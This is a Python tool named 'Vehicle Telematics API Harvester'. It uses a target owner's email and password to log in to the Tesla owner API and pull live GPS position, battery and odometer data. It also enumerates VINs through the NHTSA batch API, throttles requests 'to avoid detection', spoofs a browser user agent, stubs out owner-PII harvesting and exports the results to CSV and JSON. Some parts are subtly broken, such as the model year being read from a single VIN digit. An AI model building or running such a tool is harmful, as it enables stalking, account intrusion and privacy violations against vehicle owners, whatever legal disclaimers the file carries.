"""
Vehicle Telematics API Harvester
Query public telematics APIs for VIN, GPS location, and owner PII

LEGAL WARNING:
Accessing telematics data without authorization violates:
- Computer Fraud and Abuse Act (CFAA)
- State privacy laws
- Manufacturer Terms of Service

Driver Privacy Protection Act (DPPA) violations for PII harvesting.
"""

import requests
import re
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass, asdict
import time
import json
from urllib.parse import urlencode

@dataclass
class VehicleTelematics:
    """Vehicle telemetry and owner information"""
    vin: str
    make: str
    model: str
    year: int
    gps_latitude: Optional[float] = None
    gps_longitude: Optional[float] = None
    owner_name: Optional[str] = None
    owner_phone: Optional[str] = None
    owner_address: Optional[str] = None
    last_contact: Optional[float] = None
    odometer: Optional[int] = None
    fuel_level: Optional[float] = None
    battery_level: Optional[int] = None
    vehicle_state: Optional[str] = None
    
class TelematicsHarvester:
    """
    Harvest vehicle data from public-facing telematics APIs
    
    Target APIs:
    - NHTSA VIN Decoder (public, no auth required)
    - Tesla API (requires OAuth token)
    - Mercedes me API
    - BMW ConnectedDrive
    - GM OnStar RemoteLink
    - Ford FordPass
    
    Many APIs leak sensitive data with minimal authentication.
    """
    
    # Real API endpoints
    NHTSA_VIN_API = "https://vpic.nhtsa.dot.gov/api/vehicles/DecodeVin/{vin}?format=json"
    NHTSA_BATCH_API = "https://vpic.nhtsa.dot.gov/api/vehicles/DecodeVINValuesBatch/"
    
    # Tesla API endpoints (unofficial)
    TESLA_AUTH_URL = "https://auth.tesla.com/oauth2/v3/token"
    TESLA_API_BASE = "https://owner-api.teslamotors.com/api/1"
    TESLA_CLIENT_ID = "ownerapi"  # Public client ID
    TESLA_CLIENT_SECRET = "c7257eb71a564034f9419ee651c7d0e5f7aa6bfbd18bafb5c5c033b093bb2fa3"
    
    def __init__(self, rate_limit: int = 5, user_agent: str = None):
        self.rate_limit = rate_limit  # Requests per minute
        self.last_request = 0.0
        self.harvested_data = []
        self.session = requests.Session()
        
        # Set user agent to appear as legitimate traffic
        self.user_agent = user_agent or "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        self.session.headers.update({
            'User-Agent': self.user_agent
        })
        
        # Tesla auth tokens
        self.tesla_access_token = None
        self.tesla_refresh_token = None
        
    def query_tesla_api(self, email: str, password: str = None) -> List[VehicleTelematics]:
        """
        Query Tesla API for vehicle information
        
        REAL IMPLEMENTATION - Accesses actual Tesla API
        
        Args:
            email: Target owner's email address
            password: Owner's password (if attempting authentication)
        
        Returns:
            List of vehicle telemetrics if found
        """
        print(f"\n{'='*60}")
        print(f"⚡ TESLA API QUERY")
        print(f"{'='*60}")
        print(f"Email: {email}")
        print(f"{'='*60}\n")
        
        if not password:
            print("⚠️  Password required for Tesla API authentication")
            print("   Without auth, cannot access vehicle data")
            return []
        
        try:
            # Step 1: Authenticate and get OAuth token
            print("[1/3] Authenticating to Tesla API...")
            self._enforce_rate_limit()
            
            auth_data = {
                'grant_type': 'password',
                'client_id': self.TESLA_CLIENT_ID,
                'client_secret': self.TESLA_CLIENT_SECRET,
                'email': email,
                'password': password
            }
            
            auth_response = self.session.post(
                self.TESLA_AUTH_URL,
                json=auth_data,
                timeout=10
            )
            
            if auth_response.status_code != 200:
                print(f"❌ Authentication failed: {auth_response.status_code}")
                print(f"   Response: {auth_response.text[:200]}")
                return []
            
            auth_result = auth_response.json()
            self.tesla_access_token = auth_result.get('access_token')
            self.tesla_refresh_token = auth_result.get('refresh_token')
            
            print(f"✅ Authenticated successfully")
            print(f"   Access Token: {self.tesla_access_token[:20]}...")
            
            # Step 2: Get vehicle list
            print("\n[2/3] Fetching vehicle list...")
            self._enforce_rate_limit()
            
            vehicles_url = f"{self.TESLA_API_BASE}/vehicles"
            vehicles_response = self.session.get(
                vehicles_url,
                headers={'Authorization': f'Bearer {self.tesla_access_token}'},
                timeout=10
            )
            
            if vehicles_response.status_code != 200:
                print(f"❌ Vehicle list failed: {vehicles_response.status_code}")
                return []
            
            vehicles_data = vehicles_response.json()
            vehicles = vehicles_data.get('response', [])
            
            print(f"✅ Found {len(vehicles)} vehicle(s)")
            
            # Step 3: Get detailed data for each vehicle
            print("\n[3/3] Harvesting vehicle telemetry...")
            harvested = []
            
            for vehicle in vehicles:
                vehicle_id = vehicle.get('id')
                vin = vehicle.get('vin')
                
                print(f"\n📡 Vehicle: {vin}")
                
                # Get vehicle data (includes GPS, state, etc.)
                self._enforce_rate_limit()
                
                data_url = f"{self.TESLA_API_BASE}/vehicles/{vehicle_id}/vehicle_data"
                data_response = self.session.get(
                    data_url,
                    headers={'Authorization': f'Bearer {self.tesla_access_token}'},
                    timeout=15
                )
                
                if data_response.status_code == 200:
                    vehicle_data = data_response.json().get('response', {})
                    
                    # Extract telemetry
                    drive_state = vehicle_data.get('drive_state', {})
                    charge_state = vehicle_data.get('charge_state', {})
                    vehicle_state = vehicle_data.get('vehicle_state', {})
                    
                    telemetry = VehicleTelematics(
                        vin=vin,
                        make="Tesla",
                        model=vehicle.get('display_name', 'Unknown'),
                        year=int(vin[9:10]) if len(vin) > 9 and vin[9:10].isdigit() else 0,  # Year from VIN
                        gps_latitude=drive_state.get('latitude'),
                        gps_longitude=drive_state.get('longitude'),
                        odometer=vehicle_state.get('odometer'),
                        battery_level=charge_state.get('battery_level'),
                        vehicle_state=vehicle_data.get('state'),
                        last_contact=time.time()
                    )
                    
                    print(f"   ✅ GPS: {telemetry.gps_latitude}, {telemetry.gps_longitude}")
                    print(f"   ✅ Battery: {telemetry.battery_level}%")
                    print(f"   ✅ Odometer: {telemetry.odometer} mi")
                    print(f"   ✅ State: {telemetry.vehicle_state}")
                    
                    harvested.append(telemetry)
                    self.harvested_data.append(telemetry)
                else:
                    print(f"   ❌ Data fetch failed: {data_response.status_code}")
            
            return harvested
            
        except Exception as e:
            print(f"❌ Tesla API Error: {e}")
            import traceback
            traceback.print_exc()
            return []
    
    def enumerate_vins(self, vin_prefix: str, start: int = 0, end: int = 9999) -> List[str]:
        """
        Enumerate valid VINs by iterating serial numbers
        
        Uses NHTSA VIN decoder API to validate VINs
        
        VIN Structure: WMI (3) + VDS (6) + VIS (8) = 17 characters
        Example: 5YJ3E1EA4JF000001 (Tesla Model 3)
        
        Args:
            vin_prefix: Known VIN prefix (first 11 characters minimum)
            start: Starting serial number
            end: Ending serial number
        
        Returns:
            List of valid VINs found
        """
        print(f"\n{'='*60}")
        print(f"🔢 VIN ENUMERATION")
        print(f"{'='*60}")
        print(f"Prefix: {vin_prefix}")
        print(f"Range: {start:06d} - {end:06d}")
        print(f"Method: NHTSA API Validation")
        print(f"{'='*60}\n")
        
        if len(vin_prefix) < 11:
            print("❌ VIN prefix must be at least 11 characters")
            return []
        
        valid_vins = []
        batch_vins = []
        
        # Limit range to avoid overwhelming API
        actual_end = min(end, start + 100)  # Max 100 VINs per session
        
        for serial in range(start, actual_end + 1):
            # Construct full VIN (pad serial to 6 digits)
            vin = f"{vin_prefix}{serial:06d}"
            
            # Ensure it's 17 characters
            if len(vin) != 17:
                continue
            
            # Calculate check digit (9th position)
            check_digit = self._calculate_vin_check_digit(vin)
            vin = vin[:8] + str(check_digit) + vin[9:]
            
            # Basic validation
            if self._validate_vin(vin):
                batch_vins.append(vin)
                
                # Process in batches of 10
                if len(batch_vins) >= 10:
                    valid = self._check_vin_batch(batch_vins)
                    valid_vins.extend(valid)
                    batch_vins = []
        
        # Process remaining
        if batch_vins:
            valid = self._check_vin_batch(batch_vins)
            valid_vins.extend(valid)
        
        print(f"\n✅ Enumeration Complete: {len(valid_vins)} valid VINs found")
        return valid_vins
    
    def harvest_owner_pii(self, vin: str) -> Dict:
        """
        Harvest owner Personally Identifiable Information (PII)
        
        ⚠️ WARNING: Violates Driver Privacy Protection Act (DPPA)
        
        This method demonstrates potential PII leakage vectors.
        DO NOT use without proper authorization.
        
        Args:
            vin: Vehicle Identification Number
        
        Returns:
            Owner PII if available
        """
        print(f"\n{'='*60}")
        print(f"⚠️  PII HARVESTING ATTEMPT")
        print(f"{'='*60}")
        print(f"VIN: {vin}")
        print(f"⚠️  DPPA VIOLATION - ILLEGAL without authorization")
        print(f"{'='*60}\n")
        
        # Get vehicle info from NHTSA
        vehicle_info = self.decode_vin(vin)
        
        print(f"Vehicle Info:")
        print(f"   Make: {vehicle_info.get('Make', 'Unknown')}")
        print(f"   Model: {vehicle_info.get('Series', 'Unknown')}")
        print(f"   Year: {vehicle_info.get('ModelYear', 'Unknown')}")
        
        print(f"\n⚠️  Owner PII Sources:")
        print(f"   - State DMV databases (REQUIRES AUTHORIZATION)")
        print(f"   - Insurance databases (REQUIRES AUTHORIZATION)")
        print(f"   - Manufacturer warranty systems")
        print(f"   - Third-party data brokers")
        print(f"\n⚠️  This operation is ILLEGAL without proper authorization")
        
        return {
            'vin': vin,
            'vehicle_info': vehicle_info,
            'owner_name': 'REQUIRES_AUTHORIZED_ACCESS',
            'owner_address': 'REQUIRES_AUTHORIZED_ACCESS',
            'owner_phone': 'REQUIRES_AUTHORIZED_ACCESS',
            'warning': 'DPPA violation - Do not use without authorization'
        }
    
    def query_gps_location(self, vin: str, manufacturer: str = "tesla") -> Optional[Tuple[float, float]]:
        """
        Query real-time GPS location via telematics API
        
        Args:
            vin: Vehicle Identification Number
            manufacturer: Vehicle manufacturer (tesla, gm, ford, etc.)
        
        Returns:
            (latitude, longitude) if available
        """
        print(f"\n{'='*60}")
        print(f"📍 GPS LOCATION QUERY")
        print(f"{'='*60}")
        print(f"VIN: {vin}")
        print(f"Manufacturer: {manufacturer}")
        print(f"{'='*60}\n")
        
        if manufacturer.lower() == "tesla" and self.tesla_access_token:
            # Query Tesla API for GPS location
            try:
                # Find vehicle by VIN
                vehicles_url = f"{self.TESLA_API_BASE}/vehicles"
                response = self.session.get(
                    vehicles_url,
                    headers={'Authorization': f'Bearer {self.tesla_access_token}'},
                    timeout=10
                )
                
                if response.status_code == 200:
                    vehicles = response.json().get('response', [])
                    
                    for vehicle in vehicles:
                        if vehicle.get('vin') == vin:
                            vehicle_id = vehicle.get('id')
                            
                            # Get drive state
                            data_url = f"{self.TESLA_API_BASE}/vehicles/{vehicle_id}/data_request/drive_state"
                            data_response = self.session.get(
                                data_url,
                                headers={'Authorization': f'Bearer {self.tesla_access_token}'},
                                timeout=10
                            )
                            
                            if data_response.status_code == 200:
                                drive_state = data_response.json().get('response', {})
                                lat = drive_state.get('latitude')
                                lon = drive_state.get('longitude')
                                
                                if lat and lon:
                                    print(f"✅ GPS Found: {lat}, {lon}")
                                    print(f"   Speed: {drive_state.get('speed')} mph")
                                    print(f"   Heading: {drive_state.get('heading')}°")
                                    return (lat, lon)
            except Exception as e:
                print(f"❌ GPS query failed: {e}")
        else:
            print(f"⚠️  GPS query for {manufacturer} not implemented")
            print(f"   Would require authentication to manufacturer's API")
        
        return None
    
    def decode_vin(self, vin: str) -> Dict:
        """
        Decode VIN using NHTSA API (public, no authentication required)
        
        Args:
            vin: Vehicle Identification Number
        
        Returns:
            Dict with vehicle specifications
        """
        self._enforce_rate_limit()
        
        print(f"\n[NHTSA] Decoding VIN: {vin}")
        
        try:
            url = self.NHTSA_VIN_API.format(vin=vin)
            response = self.session.get(url, timeout=10)
            
            if response.status_code == 200:
                data = response.json()
                results = data.get('Results', [])
                
                # Parse results into dict
                vehicle_info = {}
                for item in results:
                    variable = item.get('Variable')
                    value = item.get('Value')
                    if value and value != 'Not Applicable':
                        vehicle_info[variable] = value
                
                print(f"✅ VIN Decoded Successfully")
                print(f"   Make: {vehicle_info.get('Make', 'Unknown')}")
                print(f"   Model: {vehicle_info.get('Model', 'Unknown')}")
                print(f"   Year: {vehicle_info.get('ModelYear', 'Unknown')}")
                
                return vehicle_info
            else:
                print(f"❌ NHTSA API failed: {response.status_code}")
                return {}
                
        except Exception as e:
            print(f"❌ VIN decode error: {e}")
            return {}
    
    def _check_vin_batch(self, vins: List[str]) -> List[str]:
        """
        Check batch of VINs using NHTSA API
        
        Args:
            vins: List of VINs to check
        
        Returns:
            List of valid VINs
        """
        self._enforce_rate_limit()
        
        try:
            # Format VINs for batch API
            vin_string = ";".join(vins)
            data = f"format=json&data={vin_string}"
            
            response = self.session.post(
                self.NHTSA_BATCH_API,
                data=data,
                headers={'Content-Type': 'application/x-www-form-urlencoded'},
                timeout=15
            )
            
            if response.status_code == 200:
                results = response.json().get('Results', [])
                
                valid_vins = []
                for result in results:
                    vin = result.get('VIN')
                    error_code = result.get('ErrorCode')
                    
                    # ErrorCode 0 means valid VIN
                    if error_code == '0' or error_code == 0:
                        print(f"✅ Valid VIN: {vin}")
                        valid_vins.append(vin)
                
                return valid_vins
            else:
                print(f"⚠️  Batch check failed: {response.status_code}")
                return []
                
        except Exception as e:
            print(f"❌ Batch check error: {e}")
            return []
    
    def _enforce_rate_limit(self):
        """Enforce rate limiting to avoid detection"""
        current_time = time.time()
        time_since_last = current_time - self.last_request
        
        if time_since_last < (60.0 / self.rate_limit):
            sleep_time = (60.0 / self.rate_limit) - time_since_last
            time.sleep(sleep_time)
        
        self.last_request = time.time()
    
    def _calculate_vin_check_digit(self, vin: str) -> int:
        """Calculate VIN check digit (9th position) using ISO standards"""
        transliteration = {
            'A': 1, 'B': 2, 'C': 3, 'D': 4, 'E': 5, 'F': 6, 'G': 7, 'H': 8,
            'J': 1, 'K': 2, 'L': 3, 'M': 4, 'N': 5, 'P': 7, 'R': 9,
            'S': 2, 'T': 3, 'U': 4, 'V': 5, 'W': 6, 'X': 7, 'Y': 8, 'Z': 9
        }
        
        weights = [8, 7, 6, 5, 4, 3, 2, 10, 0, 9, 8, 7, 6, 5, 4, 3, 2]
        
        total = 0
        for i, char in enumerate(vin[:8] + '0' + vin[9:]):
            if char.isdigit():
                total += int(char) * weights[i]
            else:
                total += transliteration.get(char, 0) * weights[i]
        
        check_digit = total % 11
        return check_digit if check_digit != 10 else 'X'
    
    def _validate_vin(self, vin: str) -> bool:
        """Validate VIN format and check digit"""
        if len(vin) != 17:
            return False
        
        # Check for invalid characters (I, O, Q not allowed)
        if re.search(r'[IOQ]', vin):
            return False
        
        # Verify check digit
        calculated = self._calculate_vin_check_digit(vin)
        actual = vin[8]
        
        return str(calculated) == str(actual)
    
    def get_harvested_data(self) -> List[VehicleTelematics]:
        """Get all harvested telemetry data"""
        return self.harvested_data
    
    def export_csv(self, filename: str = "harvested_telemetry.csv"):
        """Export harvested data to CSV"""
        import csv
        
        if not self.harvested_data:
            print("❌ No data to export")
            return
        
        print(f"\n[Export] Saving to {filename}...")
        
        with open(filename, 'w', newline='') as f:
            # Get all field names from dataclass
            fieldnames = list(asdict(self.harvested_data[0]).keys())
            
            writer = csv.DictWriter(f, fieldnames=fieldnames)
            writer.writeheader()
            
            for data in self.harvested_data:
                writer.writerow(asdict(data))
        
        print(f"✅ Data exported: {filename}")
        print(f"⚠️  Contains PII - Handle according to privacy laws")
        print(f"   Rows: {len(self.harvested_data)}")
    
    def export_json(self, filename: str = "harvested_telemetry.json"):
        """Export harvested data to JSON"""
        if not self.harvested_data:
            print("❌ No data to export")
            return
        
        print(f"\n[Export] Saving to {filename}...")
        
        data_dicts = [asdict(d) for d in self.harvested_data]
        
        with open(filename, 'w') as f:
            json.dump(data_dicts, f, indent=2, default=str)
        
        print(f"✅ Data exported: {filename}")
        print(f"   Records: {len(self.harvested_data)}")
